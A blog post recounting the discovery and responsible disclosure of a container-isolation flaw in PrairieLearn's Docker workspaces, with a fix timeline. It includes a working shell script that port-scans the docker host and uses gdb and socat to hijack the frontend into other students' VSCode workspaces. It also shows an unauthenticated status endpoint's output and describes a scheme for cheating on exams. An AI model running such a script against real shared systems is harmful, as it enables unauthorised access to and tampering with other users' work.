---
layout: post
title: "[Special: Bug Hunting] Labs & Dockers! (PrairieLearn)"
author: desp
---

With enough determination, anything can be a CTF challenge :)<br>
<i style="font-size:0.85rem;line-height:1.8rem;">Note: this writeup's focus is closer to pentesting than the CTF challenges that we typically do</i>
<br><br>

## Vulnerability Disclosure Timeline

<dl>
    <dt style="font-size:0.85rem"><b>11/09/2022 3PM</b></dt>
    <dd style="margin-top: 0.2rem; margin-bottom:0.7rem;">Issue found with workspace container network isolation in a CPSC course</dd>

    <dt style="font-size:0.85rem"><b>11/09/2022 8PM</b></dt>
    <dd style="margin-top: 0.2rem; margin-bottom:0.7rem;">Weaponized issue to access other active containers along with the workspace interface server, reported to the course's teaching team</dd>

    <dt style="font-size:0.85rem"><b>12/09/2022 9AM</b></dt>
    <dd style="margin-top: 0.2rem; margin-bottom:0.7rem;">Response received: not much they can do since it seems to be a PrairieLearn-wide issue</dd>

    <dt style="font-size:0.85rem"><b>21/09/2022 4PM</b></dt>
    <dd style="margin-top: 0.2rem; margin-bottom:0.7rem;">Brought the issue up again in a TA meeting of a related course that also utilizes workspaces, instructor in charge requested a formal report</dd>

    <dt style="font-size:0.85rem"><b>22/09/2022 12AM</b></dt>
    <dd style="margin-top: 0.2rem; margin-bottom:0.7rem;">Report drafted and sent</dd>

    <dt style="font-size:0.85rem"><b>22/09/2022 10AM</b></dt>
    <dd style="margin-top: 0.2rem; margin-bottom:0.7rem;">Issue classified as vulnerability, escalated to associated head of undergraduate affairs</dd>

    <dt style="font-size:0.85rem"><b>22/09/2022 3PM</b></dt>
    <dd style="margin-top: 0.2rem; margin-bottom:0.7rem;">Further information regarding invigilation security requested, escalated to PrairieLearn maintainers</dd>

    <dt style="font-size:0.85rem"><b>22/09/2022 7PM</b></dt>
    <dd style="margin-top: 0.2rem; margin-bottom:0.7rem;">Further report drafted and sent, got in touch with PrairieLearn maintainers</dd>

    <dt style="font-size:0.85rem"><b>23/09/2022 10AM</b></dt>
    <dd style="margin-top: 0.2rem; margin-bottom:0.7rem;">Cause identified and preliminary patch has been made</dd>

    <dt style="font-size:0.85rem"><b>23/09/2022 12PM</b></dt>
    <dd style="margin-top: 0.2rem; margin-bottom:0.7rem;">Preliminary patch deployed but rollback necessary due to major regression (workspace outage)</dd>

    <dt style="font-size:0.85rem"><b>23/09/2022 3PM</b></dt>
    <dd style="margin-top: 0.2rem; margin-bottom:0.7rem;">Regression identified, patch reviewed and deployed again</dd>

    <dt style="font-size:0.85rem"><b>23/09/2022 4PM</b></dt>
    <dd style="margin-top: 0.2rem; margin-bottom:0.7rem;">Vulnerability has been verified fixed</dd>
</dl>

Thanks to the UBC CS department and the PrairieLearn team for the swift actions!
<br><br>

# Part 1: Discovery

## The things you do when you are bored

So the story goes back to my first lab in the course - I finished earlier than I expected, but I didn't have the motivation to start another assignment. So, just like everyone would do when they are bored, I ~~went on youtube like a sane person~~ started poking around in the PrairieLearn workspace given and see if anything funny happens! 

For context, [PrairieLearn](https://prairielearn.readthedocs.io/) is the platform most CPSC courses in UBC use for basically everything involving grades - assignments, labs, exams... if you can name it, it's probably on PrairieLearn. And [PrairieLearn workspaces](https://prairielearn.readthedocs.io/en/latest/workspaces/) is a pretty new feature that aims to alleviate setup pain and prevent some of the bring-your-own-device issues by giving everyone a web frontend to a full fledged linux instance on request, bound to the assignment they are working on. 

Some of you might already be able to guess how this is done (it's in the writeup title after all) - that's right, it's automatically provisioned docker instances. PrairieLearn helpfully provided [all the source you need](https://github.com/PrairieLearn/PrairieLearn/blob/master/workspace_host/interface.js) to understand how it's done, but we will get back to that in a bit. Now, you might be wondering "aren't docker containers pretty secure?", and to that I'll answer yes, but while machines don't (usually) make mistakes, us humans do all the time.

With this in mind, I set out to try some of the most common misconfigurations that could've resulted in docker escapes. While I realized I was able to do random things like circumvent their file isolation using base64 copy and pasting, along with trivially escalating to root (which I realized is by design later), everything seems to be robust enough to withstand known container escape techniques. That is until I tried snooping around on the host:
```
# ./nc -zv -w 1 172.19.0.1 1-65535
172.19.0.1: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [172.19.0.1] 43505 (?) open
(UNKNOWN) [172.19.0.1] 35083 (?) open
(UNKNOWN) [172.19.0.1] 28400 (?) open
(UNKNOWN) [172.19.0.1] 25067 (?) open
(UNKNOWN) [172.19.0.1] 22315 (?) open
(UNKNOWN) [172.19.0.1] 9402 (?) open
(UNKNOWN) [172.19.0.1] 8081 (tproxy) open
(UNKNOWN) [172.19.0.1] 7335 (?) open
(UNKNOWN) [172.19.0.1] 111 (sunrpc) open
(UNKNOWN) [172.19.0.1] 22 (ssh) open
```
Wait - huh? I wasn't expecting to be able to see any open ports at all, since it's the docker host IP. After testing connections to the ports, I've realized that I was actually able to communicate with the host:
 - 22 is actually an SSH port
 - 111 seems to be an RPC port of sorts (maybe for NFS?)
 - 8081 gives me an Express.js not found error no matter what common page requests I give
 - Rest of the ports other than 111 gave me an html page with references to VSCode on a curl GET request, which ended up being the [VSCode server](https://github.com/coder/code-server)'s frontend page

Incidentally, all of the workspace instances are hosting VSCode servers for us to code on - doesn't this mean I can connect to other workspaces?
<br><br>

## Why code a client when you can reuse one

Ok, we can connect to other workspaces, but that doesn't help much - the VSCode server used has a lot of bells and whistles that curl just won't cut it (or at least I'd go insane before i can issue that many commands to do anything useful). Also, since the container is cut off from the outside internet, the only access we can go through is the PrairieLearn proxied frontend we were given - but that only listens to our own container and nothing else. 

Is this where we give up and go home then? Nope, it just means that we need to trick our container into redirecting the frontend connection to the other workspaces! This proves to be harder than I initially thought - in fact coding the weaponized script took more than 5 times the time I used to find the misconfiguration in the first place. This was mainly because of the following requirements:
 - We need a way to reliably obtain open VSCode ports
 - We need a way to replace the node server that is running our VSCode instance with a proxy to listen on the same port, while not killing it
   - The frontend only listens to the forwarded VSCode port (8080), so we cannot use another port and expect the frontend to be able to connect to it
   - Killing the node server would crash the workspace, since `dumb-init` dies if the child process dies
   - We cannot listen to the same port with 2 processes, which means we need a way to detach from a port without killing the process
 - We need to gracefully reset the frontend connection and reconnect to the new proxy after the proxy has been set up

The following command gives a pretty good visualization how our processes are set up in the container:
```
$ pstree -a
sh /usr/bin/entrypoint.sh --bind-addr 0.0.0.0:8080 . --auth none
└─dumb-init /usr/bin/entrypoint-helper.sh --bind-addr 0.0.0.0:8080 . --auth none
    └─sh /usr/bin/entrypoint-helper.sh --bind-addr 0.0.0.0:8080 . --auth none
        └─node /usr/lib/code-server --auth none --bind-addr 0.0.0.0:8080 . --auth none
            ├─node /usr/lib/code-server --auth none --bind-addr 0.0.0.0:8080 . --auth none
            │   ├─node /usr/lib/code-server/lib/vscode/out/vs/server/fork
            │   │   ├─node /usr/lib/code-server/lib/vscode/out/bootstrap-fork --type=watcherService
            │   │   │   └─10*[{node}]
            │   │   ├─node /usr/lib/code-server/lib/vscode/out/bootstrap-fork --type=extensionHost
            │   │   │   ├─bash
            │   │   │   │   └─pstree -a
            │   │   │   └─16*[{node}]
            │   │   └─11*[{node}]
            │   └─10*[{node}]
            └─10*[{node}]
```
With that in mind, after a bit of brain racking and trial and error, I eventually figured out a series of tricks to solve all of them:
 - We can port scan the host to obtain open ports with `netcat` (and more reliably the status page as found out in the next section)
 - We can utilize `gdb` to invoke [`close(fd)`](https://man7.org/linux/man-pages/man2/close.2.html) on the socket descriptor for the port obtained through `lsof` to gracefully close the connection without terminating the server
 - Start `socat` for the proxying, replacing the node instance
 - Suspend only the node process that our connection is established to, and force a timeout so the frontend reconnects
 - Automate all of these to not need manual input since manual input is unstable during this transition

And here are all the tricks formalized into a script:
```sh
#obtain the PIDS that represents our own VSCode instances that are listening to our PrairieLearn frontend
PIDS=$(./netstat -tuplen | grep '8080.*' | grep -oh '[0-9]*/node' | grep -oh '[0-9]*' | sort | uniq)

#find other VSCode instances by either port scanning our host or getting the ports from status page to connect to (selected on random)

#PORT=$(./nc -zvn -w 1 172.19.0.1 8082-65535 2>&1 | grep -oh ' [0-9]* ' | sed -r "s/ ([0-9]*) /\1/g" | head -n 1)
PORT=$(curl http://172.19.0.1:8081/status 2>&1 | grep -oh 'PublicPort":[0-9]*' | grep -oh '[0-9]*' | shuf | head -n 1)

echo port: $PORT

#detach our VSCode instances from the port by calling close() on the respective descriptors from lsof
IFS=$'\n'
for PID in $PIDS
do
  eval gdb -batch $(./lsof -np $PID | grep -P '(LISTEN)' | grep -oh '[0-9]*u' | grep -oh '[0-9]*' | sed -zr 's/([0-9]*)+\n/-ex "call close(\1)" /g') -ex 'quit' -p $PID
done

#start proxying, listening on the same port redirecting to the port of the other instance we found
./socat tcp-l:8080,fork,reuseaddr tcp:172.19.0.1:$PORT &
./socat tcp:$(cat /etc/hosts | grep '172' | grep -oh '^.*\s' | sed "s/\s//g"):8080,fork,reuseaddr tcp:172.19.0.1:$PORT &

PIDS=$(./netstat -tuplena | grep '8080.*' | grep -oh '[0-9]*/node' | grep -oh '[0-9]*' | sort | uniq)

#debug
for PID in $PIDS
do
  echo $PID
done

#pause our own VSCode instance to reset the connection from the frontend
PID=$(echo $PIDS | grep -oh '[0-9]*$') #get last pid, likely with the connection we need to terminate

echo pid: $PID

kill -STOP $PID
```

All that's left is to try running this script now:

![](/../assets/images/prairielearn/owncode.png)

Then all we need to do is wait, click reload window, and voila! We have switched into a random workspace through its VSCode instance. Or as they say, ahem, *in hacker voice*: "I'm in."

![](/../assets/images/prairielearn/randomcode.png)
(sorry random classmate for using your codes as an example 😅)

All the fun stuff you expect to work works just like usual - the commands work, you can open and edit any of the files, or even delete everything and leave a note saying `haha pwned` 🥴 (please don't)

In all seriousness though, this means that an adversary can modify gradable files and sabotage other people's work - from copying other classmates' codes covertly to finish your own assignment, to erasing all their progress, or even fake academic misconduct events by copying one student's codes to another student's workspace, all kinds of chaos ensue from this. Definitely not a good thing for academic integrity.
<br><br><br>




## What about the other ports?

Now that we were able to weaponize connecting to other containers with our own frontend, it's time to investigate the other ports. The SSH server seems very secure after investigating, so I gave up on that almost instantly; I couldn't get the RPC port to give me any useful information either. But we still have port 8081 that just always errors:
```
# curl -vvv http://172.19.0.1:8081
* Expire in 0 ms for 6 (transfer 0x55f6677e4f50)
*   Trying 172.19.0.1...
* TCP_NODELAY set
* Expire in 200 ms for 4 (transfer 0x55f6677e4f50)
* Connected to 172.19.0.1 (172.19.0.1) port 8081 (#0)
> GET / HTTP/1.1
> Host: 172.19.0.1:8081
> User-Agent: curl/7.64.0
> Accept: */*
> 
< HTTP/1.1 404 Not Found
< X-Powered-By: Express
< Content-Security-Policy: default-src 'none'
< X-Content-Type-Options: nosniff
< Content-Type: text/html; charset=utf-8
< Content-Length: 139
< Date: Sun, 11 Sep 2022 22:06:52 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
< 
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /</pre>
</body>
</html>
* Connection #0 to host 172.19.0.1 left intact
```

Then it dawned upon me - didn't I say PrairieLearn is open source? Upon searching what port 8081 might be on the PrairieLearn github, I realized it was actually the workspace interface server - remember the [source]((https://github.com/PrairieLearn/PrairieLearn/blob/master/workspace_host/interface.js)) I linked in the introduction? Turns out that is exactly the server I was pinging, and the source code detailed how to interact with their API - which means it's time to try a `curl http://172.19.0.1:8081/status`:
```json
{"docker":[{"Id":"c2eb729a4c4ee33f00be9e0fa540a6d2fb14523093e8265bf9af07b727814444","Names":["/workspace-8f2399ac-0604-4fe0-9dce-18b2bbd39c1d"],"Image":"[REDACTED]/workspace:1.1.2","ImageID":"sha256:[REDACTED]","Command":"/usr/bin/env sh /usr/bin/entrypoint.sh --bind-addr 0.0.0.0:8080 . --auth none","Created":1662956312,"Ports":[{"IP":"0.0.0.0","PrivatePort":8080,"PublicPort":5658,"Type":"tcp"},{"IP":"::","PrivatePort":8080,"PublicPort":5658,"Type":"tcp"}],"Labels":{},"State":"running","Status":"Up 35 seconds","HostConfig":{"NetworkMode":"no-internet"},"NetworkSettings":{"Networks":{"no-internet":{"IPAMConfig":null,"Links":null,"Aliases":null,"NetworkID":"[REDACTED]","EndpointID":"[REDACTED]","Gateway":"172.19.0.1","IPAddress":"172.19.0.3","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"MacAddress":"[REDACTED]","DriverOpts":null}}},"Mounts":[{"Type":"bind","Source":"[REDACTED]","Destination":"/home/coder","Mode":"","RW":true,"Propagation":"rprivate"}]}, (...) ],"postgres":"ok"}
```
Oh boy, that's a lot of sensitive information - I didn't even have to authenticate in any way. While that saves us a lot of guessing pain, it doesn't give us more attack vectors; but that's not the case when it comes to the other endpoints. They likely allow adversaries to create or reset workspace instances whenever they want, which makes DoSing trivial; not to mention the interface server as a whole being accessible also exposes the possibility of escalation to host if there exists any vulnerabilities in the server itself. 

<br><br>

I eventually also figured out that you can just connect to the private ports of the other containers from our own container directly, and proxying will work the same. Looking at the codes and entrypoint commands run in the container, we can see why:
 - For the interface server, `server.listen()` was only [called with a port](https://github.com/PrairieLearn/PrairieLearn/blob/master/workspace_host/interface.js#L223), which means it falls back to the [default host](https://nodejs.org/api/net.html#serverlistenport-host-backlog-callback) of `0.0.0.0`
 - For the VSCode instances, `--bind-addr` is bound to `0.0.0.0:8080` as visible in `pstree -a` output above; the public port assigned is also bound to `"IP":"0.0.0.0"` as shown in the status page response above

Since `0.0.0.0` is accessible from anywhere if there is no infra-side access rules preventing it (e.g. `iptables` filters), it makes sense both container-to-container communication and access through host was possible.

It also seems like this issue should be present in all of the courses that uses workspaces - The listening addresses and how workspace instances are made are all automated using the same codes after all. Time to report all these to the profs...
<br><br><br>

# Part 2: Reporting 

## How to feel like a bug hunter

I initially contacted the teaching team of the course but they don't seem to be able to do much - though they did mention they will think of something to do about this. Fast forward a week or so, and we were talking about some other PrairieLearn issues in the course I'm TAing this term - which suddenly reminded me of this issue. 

Seeing that I still haven't received much news yet, I figured I might as well just bring it up in the meeting too since we will also be using workspaces in some future assignments - this time, however, the instructor in charge got much more alarmed. As the meeting was about to end, he requested me to write a formal report and email it to him so he can determine how serious it is, which I did that evening. While doing that, I also made a rough ~~and ugly~~ diagram to illustrate how the issue i found works:

![](/../assets/images/prairielearn/path-of-access.png)

The next morning, I received a request for information embargoing on this issue - it has now been considered a vulnerability, and is being escalated to the department heads to figure out what to do with this. I then received inquiries about how this might impact academic integrity, especially in the context of exams if left unfixed - which I drafted another thousand-word email in answer to. 

While writing that I also realized how the vulnerability is more serious than I initially thought if workspaces were used in exams: Since the workspace host is shared across the entire course regardless of assignment types, this means that a student might be able to ask/pay another student in the course that is not taking the exam at the same time as them to work on their exam - they will just have to figure out how to identify the workspace instance beforehand, have the student that is not taking the exam fire up an assignment with workspaces while the other student is taking the exam, proxy into workspaces until they reach the right one, and work on it from outside the invigilation room, ensuring completely covertness since if invigilators aren't focusing on the student the entire time it looks basically like they are coding it themselves. Poof! We have academic integrity blown to smithereens. And that's exactly what we don't want.

Eventually, it was escalated to the PrairieLearn maintainers themselves, and I was invited to work with them on resolving this vulnerability. After a *slight* mishap while patching which basically took the entire workspace docker network down, we were able to get an infra-side patch deployed correctly, and I was able to verify that the vulnerable endpoints no longer responded to me. With this, the saga has finally come to an end - and everyone lived happily after.

That is I guess everyone *aside from these classmates* - oopsies! I'm sorry 😢
![](/../assets/images/prairielearn/oopsies.png)

![](/../assets/images/prairielearn/oopsies2.png)

# Thoughts

Although this is not an official bug bounty thing and the vulnerability really isn't something novel, it was still really fun having a glimpse of what the bug hunting world and the processes involved might look like. I am also really glad to be able to work with so many cool people on this journey - from our own profs to the PrairieLearn maintainers, it's been a blast talking to and working with them on resolving this.

I've also really liked the concept of workspaces in PrairieLearn since it is convenient both for the students and also for the teaching team, so it felt pretty nice that I contributed in some way that there can be even more courses utilizing this feature in the future. 

Again, thanks to the UBC CS department and the PrairieLearn maintainers for taking my ramblings seriously and handling this so quickly!